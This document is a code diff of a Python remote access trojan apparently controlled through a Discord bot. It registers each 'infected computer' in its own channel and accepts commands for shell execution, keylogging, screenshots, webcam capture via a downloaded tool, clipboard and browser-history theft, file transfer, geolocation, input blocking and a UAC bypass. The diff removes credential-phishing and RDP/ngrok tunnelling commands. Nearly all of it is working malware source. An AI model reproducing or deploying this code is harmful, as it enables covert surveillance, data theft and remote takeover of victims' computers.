@@ -8,82 +8,50 @@ import random
 import time
 import subprocess
 import discord
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
 from ctypes import *
 import asyncio
 import discord
-import atexit
-token = ''
+from discord import utils
+token = '' #Put the token of your discord bot here
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
 bot = commands.Bot(command_prefix='!')
-
 chosen = None
 uuidgen = None
-
 helpmenu = """
-
 Availaible commands are :
 
---> !message = Show a message box
-
---> !output = Execute a custom command that sends output
-
---> !custom = Execute a custom command that does not send any output
-
---> !voice = Make a voice say outloud a custom sentence
-
+--> !message = Show a message box displaying your text / Syntax  = "!message example"
+--> !shell = Execute a shell command /Syntax  = "!shell whoami"
+--> !window = Get infected computer user current active window
+--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
 --> !admincheck = Check if program has admin privileges
-
 --> !sysinfo = Gives info about infected computer
-
---> !history = Get infected computer navigation history
-
+--> !history = Get computer navigation history
 --> !download = Download a file from infected computer
-
---> !cd = Changes directory
-
---> !write = Type your desired sentence on infected computer
-
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"
-
 --> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
-
+--> !cd = Changes directory
+--> !write = Type your desired sentence on infected computer
+--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"
 --> !clipboard = Retrieve infected computer clipboard content
-
---> !geolocate = Approximately geolocate using latitude and longitude of the ip adress with google map
-
---> !startkeylogger = Starts a keylogger
-
+--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
+--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
 --> !stopkeylogger = Stops keylogger
-
 --> !dumpkeylogger = Dumps the keylog
-
 --> !volumemax = Put volume at 100%
-
---> !rdp = Activates RDP on target's computer and port forwards 3389 with ngrok (needs admin)
-
---> !stoprdp = Deactivates RDP on target's computer
-
+--> !volumezero = Put volume at 0%
 --> !idletime = Get the idle time of user's on target computer
-
---> !sing = Play the chosen video in background
-
---> !stopsing = I think you get the point
-
---> !phishcreds = Phish user's credentials
-
---> !blockinput = Blocks user's keyboard and mouse 
-
---> !unblockinput = Unblocks user's keyboard and mouse
-
---> !screenshot = Get the screenshot of the user's current desktop screen
-
+--> !sing = Play chosen video in background
+--> !stopsing = Stop video playing in background
+--> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
+--> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
+--> !screenshot = Get the screenshot of the user's current screen
 --> !exit = Exit program
-
 """
-
 
 @client.event
 async def on_ready():
@@ -93,141 +61,182 @@ async def on_ready():
     import json
     with urllib.request.urlopen("https://geolocation-db.com/json") as url:
         data = json.loads(url.read().decode())
-    sep = ','
-    rest = str(data).split(sep, 1)[0]
-    ah = re.sub(r'^.*? ', ' ', rest)
-    text = re.sub("[^a-zA-Z]", "", ah)
-    final = text.lower()
+        flag = data['country_code']
+        ip = data['IPv4']
     global uuidgen
     uuidgen = str(uuid.uuid4())
-    from requests import get
-    ip = get('https://api.ipify.org').text
-    pp = ip
     import os
-    channel = client.get_channel()  # Put ID of channel here
-
+    game = discord.Game(f"Controlling : {platform.system()} {platform.release()}"  )
+    await client.change_presence(status=discord.Status.online, activity=game)
+    newchannel = await client.guilds[0].create_text_channel(uuidgen)
+    channel_ = discord.utils.get(client.get_all_channels(), name=uuidgen)
+    channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    value1 = f"@here :white_check_mark: New session opened {uuidgen} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
     if is_admin == True:
-        value1 = "@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + \
-            platform.release() + " | " + ip + " " + ":flag_" + final + ":" + \
-            " | " + "User : " + os.getlogin() + " | " + ":gem:"
-
-        # incase of multiple guilds (servers), use a for loop
-        await client.guilds[0].system_channel.send(value1)
-
+        await channel.send(f'{value1} | :gem:')
     elif is_admin == False:
-        value2 = "@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + \
-            " " + platform.release() + " | " + ip + " " + ":flag_" + final + \
-            ":" + " | " + "User : " + os.getlogin()
-
-        # incase of multiple guilds (servers), use a for loop
-        await client.guilds[0].system_channel.send(value2)
+        await channel.send(value1)
 
 
 def volumeup():
-    import win32api
-    import win32con
-    for i in range(90):
-        win32api.keybd_event(win32con.VK_VOLUME_UP, 0)
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = cast(interface, POINTER(IAudioEndpointVolume))
+    if volume.GetMute() == 1:
+        volume.SetMute(0, None)
+    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
 
+def volumedown():
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = cast(interface, POINTER(IAudioEndpointVolume))
+    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
 
 @client.event
 async def on_message(message):
-    if message.content.startswith("!interact"):
-        global chosen
-        chosen = message.content[10:]
-
-    if chosen != uuidgen:
+    if message.channel.name != uuidgen:
         pass
     else:
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
-            file_keys = temp + "key_log.txt"
+            file_keys = f"temp {key_log.txt}"
             file = discord.File(file_keys, filename=file_keys)
             await message.channel.send("[*] Command successfuly executed", file=file)
-            os.popen("del " + file_keys)
+            os.popen(f"del {file_keys}")
 
         if message.content == "!exit":
             import sys
             sys.exit()
 
+        if message.content == "!window":
+            import win32gui
+            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+            await message.channel.send(f"[*] User current active window is : {window}")
+
         if message.content == "!screenshot":
             import os
             from mss import mss
             with mss() as sct:
-                sct.shot(output=os.path.join(
-                    os.getenv('TEMP') + "\\monitor.png"))
-            file = discord.File(os.path.join(
-                os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
+                sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
+            file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
             await message.channel.send("[*] Command successfuly executed", file=file)
-            os.remove(os.path.join(
-                os.getenv('TEMP') + "\\monitor.png"))
+            os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
+
+        if message.content == "!volumemax":
+            volumeup()
+            await message.channel.send("[*] Volume put to 100%")
+
+        if message.content == "!volumezero":
+            volumedown()
+            await message.channel.send("[*] Volume put to 0%")
+
+        if message.content == "!webcampic": # This module downloads a file over the internet to take a webcampic this is not optimal at all but avoids adding many unnecessary megabytes to exe if compiled.
+            import os
+            import urllib.request
+            from zipfile import ZipFile
+            directory = os.getcwd()
+            try:
+                os.chdir(os.getenv('TEMP'))
+                urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", "temp.zip")
+                with ZipFile("temp.zip") as zipObj:
+                    zipObj.extractall()
+                os.system("WebCamImageSave.exe /capture /FileName temp.png")
+                file = discord.File("temp.png", filename="temp.png")
+                await message.channel.send("[*] Command successfuly executed", file=file)
+                os.remove("temp.zip")
+                os.remove("temp.png")
+                os.remove("WebCamImageSave.exe")
+                os.remove("readme.txt")
+                os.remove("WebCamImageSave.chm")
+                os.chdir(directory)
+            except:
+                await message.channel.send("[!] Command failed")
 
         if message.content.startswith("!message"):
             import ctypes
+            import time
             MB_YESNO = 0x04
             MB_HELP = 0x4000
             ICON_STOP = 0x10
-            result = ctypes.windll.user32.MessageBoxW(
-                0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP)
-
-        if message.content.startswith("!phishcreds"):
-            import os
-            import io
-            import sys
-            import sqlite3
-            import json
-            import shutil
-            import win32cred
-            import win32crypt
-            import win32api
+            def mess():
+                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
+            import threading
+            messa = threading.Thread(target=mess)
+            messa._running = True
+            messa.daemon = True
+            messa.start()
             import win32con
-            import pywintypes
-            CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
-            CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials
-            creds = []
-            creds = CredUIPromptForCredentials(
-                os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
-            print(creds)
-            await message.channel.send("[*] Command successfuly executed " + str(creds))
+            import win32gui
+            def get_all_hwnd(hwnd,mouse): #Here define a statement looking through all visible windows titles find our message box then get the handle and show it in the foreground
+                def winEnumHandler(hwnd, ctx):
+                    if win32gui.IsWindowVisible(hwnd):
+                        print(win32gui.GetWindowText(hwnd))
+                    if win32gui.GetWindowText(hwnd) == "Error":
+                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
+                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+                        return None
+                    else:
+                        pass
+                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
+                    win32gui.EnumWindows(winEnumHandler,None)
+            win32gui.EnumWindows(get_all_hwnd, 0)
 
         if message.content.startswith("!wallpaper"):
             import ctypes
-            ctypes.windll.user32.SystemParametersInfoW(
-                20, 0, message.content[11:], 0)
+            import os
+            path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
+            await message.attachments[0].save(path)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
             await message.channel.send("[*] Command successfuly executed")
 
         if message.content.startswith("!upload"):
             await message.attachments[0].save(message.content[8:])
             await message.channel.send("[*] Command successfuly executed")
 
-        if message.content.startswith("!output"):
+        if message.content.startswith("!shell"):
+            global status
+            import time
+            status = None
             import subprocess
             import os
-            instruction = message.content[8:]
-            output = subprocess.run(instruction, stdout=subprocess.PIPE,
-                                    shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = str(output.stdout.decode('CP437'))
-            numb = len(result)
-            if numb > 1990:
-                f1 = open("output.txt", 'a')
-                f1.write(result)
-                f1.close()
-                file = discord.File("output.txt", filename="output.txt")
-                await message.channel.send("[*] Command successfuly executed", file=file)
-                os.popen("del output.txt")
+            instruction = message.content[7:]
+            def shell():
+                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                global status
+                status = "ok"
+                return output
+            import threading
+            shel = threading.Thread(target=shell) #Use of threading and a global variable to avoid hanging if command is too long to produce an output 
+            shel._running = True
+            shel.start()
+            time.sleep(1)
+            shel._running = False
+            if status:
+                result = str(shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc..
+                print(result)
+                numb = len(result)
+                print(numb)
+                if numb < 1:
+                    await message.channel.send("[*] Command not recognized or no output was obtained")
+                elif numb > 1990:
+                    f1 = open("output.txt", 'a')
+                    f1.write(result)
+                    f1.close()
+                    file = discord.File("output.txt", filename="output.txt")
+                    await message.channel.send("[*] Command successfuly executed", file=file)
+                    os.popen("del output.txt")
+                else:
+                    await message.channel.send("[*] Command successfuly executed : " + result)
             else:
-                await message.channel.send("[*] Command successfuly executed : " + result)
-        if message.content.startswith("!custom"):
-            import os
-            import subprocess
-            os.popen(message.content[8:])
-            await message.channel.send("[*] Command successfuly executed")
+                await message.channel.send("[*] Command not recognized or no output was obtained")
+                status = None
 
         if message.content.startswith("!download"):
-            file = discord.File(
-                message.content[10:], filename=message.content[10:])
+            file = discord.File(message.content[10:], filename=message.content[10:])
             await message.channel.send("[*] Command successfuly executed", file=file)
 
         if message.content.startswith("!cd"):
@@ -274,12 +283,12 @@ async def on_message(message):
                 text = ctypes.c_char_p(data_locked)
                 value = text.value
                 kernel32.GlobalUnlock(data_locked)
-                body = str(value)
+                body = value.decode()
                 user32.CloseClipboard()
-                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + body)
+                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))
 
         if message.content.startswith("!stopsing"):
-            import os
+            import os 
             os.system("taskkill /F /IM iexplore.exe")
             os.chdir(appdata)
             os.system("del x0.vbs")
@@ -296,16 +305,9 @@ async def on_message(message):
         if message.content == "!geolocate":
             import urllib.request
             import json
-
             with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                 data = json.loads(url.read().decode())
-                lol = str(data)
-                lat = lol[112:]
-                sep = ','
-                restlat = lat.split(sep, 1)[0]
-                longg = lol[134:]
-                restlong = longg.split(sep, 1)[0]
-                link = "http://www.google.com/maps/place/" + restlat + "," + restlong
+                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                 await message.channel.send("[*] Command successfuly executed : " + link)
 
         if message.content == "!admincheck":
@@ -314,7 +316,7 @@ async def on_message(message):
             if is_admin == True:
                 await message.channel.send("[*] Congrats you're admin")
             elif is_admin == False:
-                await message.channel.send("[*] Sorry, you're not admin")
+                await message.channel.send("[!] Sorry, you're not admin")
 
         if message.content == "!uacbypass":
             import os
@@ -323,7 +325,6 @@ async def on_message(message):
                 server = os.environ['logonserver'][2:]
             else:
                 server = None
-
             def if_user_is_admin(Server):
                 groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
                 isadmin = False
@@ -386,7 +387,7 @@ async def on_message(message):
                         print('[+] Trying to bypass the UAC')
                         try:
                             current_dir = os.path.dirname(
-                                os.path.realpath(__file__)) + '\\' + "Prototype.exe"
+                                os.path.realpath(__file__)) + '\\' + sys.argv[0]
                             cmd = '{} /k {} {}'.format(CMD, COMM, current_dir)
                             print(cmd)
                             bypass_uac(cmd)
@@ -404,20 +405,16 @@ async def on_message(message):
                 await message.channel.send("[*] Command failed : User not in administator group")
 
         if message.content.startswith("!sing"):
-            import os
+            import os  #Bad code that I wrote long ago but since it's a dumb command it's not too big of a problem
             volumeup()
-            os.chdir(appdata)
+            os.chdir(appdata)   
             choice = message.content[6:]
             f1 = open('x0.vbs', 'a')
-            f1.write(
-                'Set ie = CreateObject("InternetExplorer.Application")' + "\r\n")
+            f1.write('Set ie = CreateObject("InternetExplorer.Application")' + "\r\n")
             f1.write("ie.Visible = 0" + "\r\n")
             f1.write('ie.Navigate2' + ' ' + '"' + choice + '"')
             f1.close()
             os.system('x0.vbs')
-            import time
-            time.sleep(10)
-            os.system("del x0.vbs")
 
         if message.content == "!startkeylogger":
             import base64
@@ -428,7 +425,6 @@ async def on_message(message):
             log_dir = temp
             logging.basicConfig(filename=(log_dir + "key_log.txt"),
                                 level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
             def keylog():
                 def on_press(key):
                     logging.info(str(key))
@@ -472,28 +468,6 @@ async def on_message(message):
             await message.channel.send('User idle for %.2f seconds.' % duration)
             import time
             time.sleep(1)
-        if message.content == "!rdp":
-            import os
-            import ctypes
-            import logging
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == False:
-                body = "you need to be admin for this operation"
-                await message.channel.send("[*] Command failed " + body)
-            else:
-                try:
-                    os.popen(
-                        'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
-                    os.popen(
-                        "netsh advfirewall firewall set rule group='remote desktop' new enable=Yes")
-                    from pyngrok import ngrok
-                    public_url = ngrok.connect(3389)
-                    rdp = ngrok.connect(3389, "tcp")
-                    tunnels = ngrok.get_tunnels()
-                    await message.channel.send("[*] Rdp Opened " + str(tunnels))
-                except:
-                    mdr = logging.exception('')
-                    await message.channel.send("[*] Command failed " + str(mdr))
 
         if message.content.startswith("!voice"):
             volumeup()
@@ -505,21 +479,20 @@ async def on_message(message):
 
         if message.content.startswith("!blockinput"):
             import ctypes
-            ok = windll.user32.BlockInput(True)
-            await  message.channel.send("[*] Command successfuly executed")
-        if message.content.startswith("!unblockinput"):
-            ok = windll.user32.BlockInput(False)
-            await  message.channel.send("[*] Command successfuly executed")
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                ok = windll.user32.BlockInput(True)
+                await message.channel.send("[*] Command successfuly executed")
+            else:
+                await message.channel.send("[!] Admin rights are required for this operation")
 
-        if message.content == "!stoprdp":
-            import os
+        if message.content.startswith("!unblockinput"):
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == False:
-                body = "you need to be admin for this operation"
-                await message.channel.send("[*] Command failed " + body)
+            if is_admin == True:
+                ok = windll.user32.BlockInput(False)
+                await  message.channel.send("[*] Command successfuly executed")
             else:
-                os.popen(
-                    'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
-                await message.channel.send("[*] Rdp stopped")
+                await message.channel.send("[!] Admin rights are required for this operation")
+
 client.run(token)
